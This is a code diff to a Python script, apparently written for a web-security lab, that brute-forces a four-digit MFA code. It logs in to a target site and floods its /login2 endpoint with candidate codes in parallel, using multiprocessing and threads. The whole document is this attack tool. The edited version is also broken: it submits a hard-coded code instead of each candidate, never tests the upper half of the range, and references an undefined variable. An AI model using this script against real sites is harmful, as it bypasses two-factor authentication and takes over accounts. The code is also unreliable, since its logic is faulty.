@@ -1,4 +1,4 @@
-import sys, requests, multiprocessing, time
+import sys, requests, multiprocessing, time, threading
 from bs4 import BeautifulSoup
 
 site = sys.argv[1]
@@ -12,7 +12,20 @@ login_url = f'https://{site}/login'
 login2_url = f'https://{site}/login2'
 
 
-multiCPUProc = 100
+multiCPUProc = 20
+
+class myThread1 (threading.Thread):
+    def __init__(self, threadID, name, counter):
+        threading.Thread.__init__(self)
+        self.threadID = threadID
+        self.name = name
+        self.count = counter
+    def run(self):
+        print ("Starting " + self.name) 
+        getMulti(1)
+        print("Exiting " + self.name)
+
+    
 
 #Taken from getUrls_multiprocessing.py and adapted for this functionality
 def time_decorator(func):
@@ -32,17 +45,25 @@ def time_decorator(func):
 
 # Sets up multiprocessing so this can be solved quickly and more efficiently
 @time_decorator
-def getMulti():
+def getMulti(iteration):
     proc = multiprocessing.Pool(multiCPUProc)
     manager = multiprocessing.Manager()
     event = manager.Event()
 
     auth_code = []
-    for i in range(0, 10000):
-        auth_code.append('%04d' % i)
-    
-    for i in range(10000):
-        proc.apply_async(attack_auth, (auth_code[i], event))
+    if iteration == 1:
+        for i in range(0, 5000):
+            auth_code.append('%04d' % i)
+        
+        for i in range(5000):
+            proc.apply_async(attack_auth, (auth_code[i], event))
+    if iteration == 2:
+        auth_code2 = auth_code
+        for i in range(5000, 10000):
+            auth_code2.append('%04d' % i)
+
+        for i in range(5000):
+            proc.apply_async(attack_auth, (auth_code2[i], event))
     proc.close()
 
     event.wait()
@@ -77,7 +98,7 @@ def attack_auth(auth_code, event):
 
     login2data = {
         'csrf' : csrf,
-        'mfa-code' : str(0).zfill(4)
+        'mfa-code' : 5850
     }
 
     resp = s.post(login2_url, data=login2data, allow_redirects=False)
@@ -87,10 +108,13 @@ def attack_auth(auth_code, event):
         print('==============================')
         print(f'== CORRECT CODE: {auth_code} ==')
         print('==============================')
-
+        event.set()
 if __name__ == '__main__':
+    thread1 = myThread1(1, "Thread-1", 1)
+    thread2 = myThread1(2, "Thread-2", 2)
 
-    time_elapsed = getMulti()
+    thread1.start()
+    thread2.start()
     print(f'Time: {time_elapsed:0.2f} seconds')
 
     
